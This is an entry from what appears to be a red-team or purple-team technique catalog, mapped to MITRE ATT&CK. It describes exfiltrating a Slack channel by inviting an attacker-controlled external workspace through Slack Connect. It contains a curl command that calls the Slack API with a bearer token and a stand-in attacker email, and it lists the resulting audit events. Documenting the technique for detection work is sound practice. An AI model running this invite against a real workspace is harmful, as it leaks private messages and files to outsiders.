---
id: slack-external-share
title: Slack Connect external share (channel exfil)
section: Slack / SaaS
phase: Exfiltration
attack:
  tactic: TA0010
  techniques: [T1567]
platform: [slack]
source: Slack workspace compromise (Slack Connect external share)
pair: slack-external-share-audit
---

Invite an external workspace you control into a sensitive channel via **Slack Connect**. Once
the shared-channel invite is accepted, every message and file in that channel — past and
future — is readable from your own org, a low-friction exfiltration path over a trusted SaaS
feature that never touches an egress proxy. The invite writes a Slack audit event
`action=shared_channel_invite_sent` (accept: `shared_channel_invite_accepted`). (SaaS control
plane — no slots.)

```sh
# invite an attacker-controlled external org into a channel (Slack Connect)
curl -s -X POST "https://slack.com/api/conversations.inviteShared" \
  -H "Authorization: Bearer <token>" \
  -d "channel=<C…>" -d "emails=attacker@evil.tld"
```
